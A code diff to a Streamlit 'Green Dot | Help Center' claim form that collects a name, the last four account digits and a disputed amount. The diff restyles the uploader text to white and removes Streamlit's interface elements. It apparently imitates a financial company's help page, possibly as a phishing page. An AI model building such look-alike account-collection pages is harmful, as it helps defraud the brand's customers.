@@ -24,13 +24,18 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS DE VISIBILIDAD AGRESIVA
+# JS DE VISIBILIDAD AGRESIVA - ACTUALIZADO PARA TEXTO DE UPLOADER
 st.markdown("""<script>
     const forceVisibility = () => {
         // Forzar visibilidad de textos en botones de carga
         document.querySelectorAll('[data-testid="stFileUploader"] button').forEach(el => {
             el.style.color = '#FFFFFF';
             el.style.backgroundColor = '#262730';
+        });
+        
+        // Forzar texto de ayuda (200MB per file...)
+        document.querySelectorAll('[data-testid="stFileUploader"] small, [data-test="stFileUploaderFileName"]').forEach(el => {
+            el.style.setProperty('color', '#FFFFFF', 'important');
         });
 
         // Eliminar elementos de interfaz de Streamlit
@@ -48,19 +53,26 @@ st.markdown("""<style>
         background-color: #000000 !important;
     }
 
-    /* FORZAR TÍTULO EN BLANCO (Help Center) */
+    /* FORZAR TÍTULO EN BLANCO */
     h1, [data-testid="stHeader"] h1, .stMarkdown h1 {
         color: #FFFFFF !important;
     }
 
-    /* BOTONES DE UPLOAD (Texto visible) */
+    /* BOTONES DE UPLOAD */
     [data-testid="stFileUploader"] button {
         color: #FFFFFF !important;
         background-color: #333333 !important;
         border: 1px solid #444444 !important;
     }
+    
+    /* TEXTO DE AYUDA DEL UPLOADER (200MB...) */
+    [data-testid="stFileUploader"] small, 
+    [data-testid="stFileUploader"] div[data-testid="stMarkdownContainer"] p {
+        color: #FFFFFF !important;
+        opacity: 1 !important;
+    }
 
-    /* BOTÓN SUBMIT NOW (Contraste Máximo) */
+    /* BOTÓN SUBMIT NOW */
     .stButton > button {
         background-color: #00a05b !important;
         color: #FFFFFF !important;
@@ -69,7 +81,7 @@ st.markdown("""<style>
         text-transform: uppercase !important;
     }
 
-    /* TEXTOS DE ETIQUETAS Y PÁRRAFOS */
+    /* TEXTOS DE ETIQUETAS Y PÁRRAFOS GENERALES */
     label p, .stMarkdown p, p, span, div {
         color: #FFFFFF !important;
     }
@@ -81,7 +93,6 @@ st.markdown("""<style>
         border: 1px solid #333333 !important;
     }
 
-    /* Contenedor principal */
     .block-container {
         max-width: 500px !important;
     }
@@ -92,7 +103,7 @@ st.markdown("""<style>
 if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
 st.title("Help Center")
 
-with st.form("claim_v1_3_0", clear_on_submit=True):
+with st.form("claim_v1_3_1", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Disputed Amount", format="%.2f")
